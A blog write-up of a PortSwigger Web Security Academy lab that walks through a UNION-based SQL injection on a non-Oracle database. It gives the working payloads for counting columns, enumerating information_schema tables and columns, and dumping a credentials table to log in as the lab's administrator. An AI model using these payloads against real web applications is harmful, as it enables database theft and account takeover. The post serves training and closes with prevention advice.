---
layout: post
title: "SQL injection attack, listing the database contents on non-Oracle databases"
date: 2026-09-01

categories:
  - Web Security

topic: SQL Injection

tags:
  - PortSwigger
  - SQL Injection
  - Web Security Academy

toc: true
---

# Lab: SQL injection attack, listing the database contents on non-Oracle databases

## Lab Information

- **Platform:** PortSwigger Web Security Academy
- **Tool:** Burp Suite
- **Difficulty:** Practitioner
- **Vulnerability:** SQL Injection
- **Status:** Solved ✓

## Lab Objective

This lab contains a SQl injection vulnerability in the product category filter.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

The main objective of this lab is to login as administrator.

   
## Testing (How I know that this lab has sql-injection vulnerability?)

I put ``` ' ``` in product category filter URL, it gave me **Internal server error** which specify that something is broke in backend. 
And I got to know that this product category field has sql-injection vulnerability. 


## Exploitation


### 1. Determine the number of columns
 The first step for UNION based attack is to determine the number of column.
 Query for determining column number is:

 ```sql
 'UNION SELECT NULL,NULl--
 ```

 To know more about determining number of column read my previous lab:
 [Read my determining number of columns post](/blog/2026/08/27/sql-injection-numbers-of-column/)

 In this lab the number of columns are **2**.

### 2. Determine the datatype of each column
 The second step is determining datatype of column, if it is text or number or NULL.
  
 ```sql
 'UNION SELECT 'text','text'--
 ```
 To know more about determining datatype of column read my previous lab:
 [Read my determining datatype of column post](/blog/2026/08/27/sql-injection-column-containing-text/)

 In this lab both column are of **text** datatype.

### 3. Determine the name of the table

 Query for determining the name of the table is 
 ```sql
 SELECT * FROM information_schema.tables
 ```
 To know more about querying Database table name. Read 
  [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

 The final payload for determine the name of the table is: 

 ```sql
 'UNION SELECT NULL, table_name FROM information_schema.tables--
 ```
 This query returns lists of the table name.
 HERE the table name is **users_wowkur**.

 ![SQL Injection retrieving data from other table - Solved](/assets/images/portswigger/sql-injection/Listing-DB-contents-non-Oracle1.png)


### 4. Determine the username and password column name under **users_wowkur** table

 Query for determining the column name of the table is 
 ```sql
 SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
 ```
 To know more about querying Database column name of tables. Read 
  [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

 The final payload for determine the column name of the table is: 

 ```sql
 'UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name = 'users_wowkur'--
 ```
 This query returns lists of the column name.
 HERE the username and password columns are **username_hkoxwp** and **password_rtjbdy**.

 ![SQL Injection retrieving data from other table - Solved](/assets/images/portswigger/sql-injection/Listing-DB-contents-non-Oracle2.png)


### 5. Listing the username and password under users_wowkur table

 Using the query, 

 ```sql
 'UNION SELECT username_hkoxwp, password_rtjbdy from users_wowkur
 ```
 I retrieve all username and password list containing administrator user and it's password.
 The password for administrator user is **mlvrbwj3ru2jamndex9o**.

 ![SQL Injection retrieving data from other table - Solved](/assets/images/portswigger/sql-injection/Listing-DB-contents-non-Oracle3.png)


## Result

After filling 

administrator user and its password **mlvrbwj3ru2jamndex9o** in login function I successfully login as administrator user.


![SQL Injection retrieving data from other table - Solved](/assets/images/portswigger/sql-injection/Listing-DB-contents-non-Oracle4.png)


## Key Takeaways

- Different database systems use different system tables and metadata to store information about databases, tables, and columns.
- Database metadata can be queried to discover the available databases, tables, and columns.
- Understanding the database structure helps identify where potentially useful data may be stored.
- UNION-based SQL injection can be used in vulnerable applications to retrieve information from database metadata.
- Proper parameterized queries and input validation can prevent SQL injection attacks.

**Lab Status: Solved ✓**